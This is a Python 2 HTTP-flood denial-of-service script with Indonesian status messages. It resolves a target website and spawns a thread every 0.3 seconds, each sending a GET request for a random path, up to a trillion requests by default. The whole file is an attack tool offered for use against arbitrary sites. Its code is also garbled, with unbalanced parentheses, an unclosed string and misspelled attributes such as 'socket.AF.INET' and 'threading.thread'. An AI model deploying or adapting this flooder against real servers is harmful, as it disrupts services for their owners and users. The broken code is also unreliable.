import random
import socket
import string
import sys  
import threading
import time 


# parse input

host=" "
ip =" "
port = ""
num_requests = 0

if len(sys.argv) == 2:
    port = 80
    num_requests = 1000000000000
elif len (sys.argv) == 3:
    port = int(sys.argv)[2])
    num_requests = 1000000000000
elif len (sys.argv) == 4:
    port = int(sys.argv)[2])
    num_requests = int(sys.argv)[3])
else:
    print "ERROR\n Gunakan: " + sys.argv[0] + "< Hostname > < port > < Jumlah Serangan >"
    sys.exit(1)

try:
    host = str(sys.argv[1]).replace("https://", " ").replace("https://", " ").replace("www.", " ")
    ip = socket.gethostbyname(host)
except socket.gaierror:
    print " ERROR\n Pastikan Anda Memasukan Website Yang Benar"
    sys.exit(2)

thread_num = 0
thread_num_mutex = threading.Lock()


def print_status():
    global thread_num
    thread_num_mutex.acquire(True)

    thread_num += 1
    print "\n " + time.ctime().split(" ")[3] + " " + "[" + str(thread_num) + "] #-#-#-#-# Serangan Sedang Dilakukan-#-#-#-#-#"

    thread_num_mutex.release()

def generate_url_patch():
    msg = str(string.letters + string.digits + string.punctuation)
    data = " ".join(random.sample(msg, 5))
    return data

def attack():
    print_status()
    url_path = generate_url_patch()

    dos = socket.socket(socket.AF.INET, socket.SOCK_STREAM)

    try:
        dos.connect((ip, port))

        dos.send("GET /%s HTTP/1.1\nHOST: %s\n\n) % (url_path, host))
    except socket.error, e:
        print "\n [Tidak Ada Koneksi Atau Server Kemungkinan Web Sudah Down ]: " + str(e)
    finally:
        dos.shutdown(socket,SHUT_RDWR)
        dos.close()

print "[#] Attack Started On " + host + " (" + ip + ") || port: " + str(port) + " || #Requests: " + str(num_requests)

all_threads = [1]

for i in xrange(num_requests):
    tl = threading.thread(target=attack)
    tl.start()
    all_threads.append(tl)

    time.sleep(0.3)

for current_thread in all_threads:
    current_thread.join()









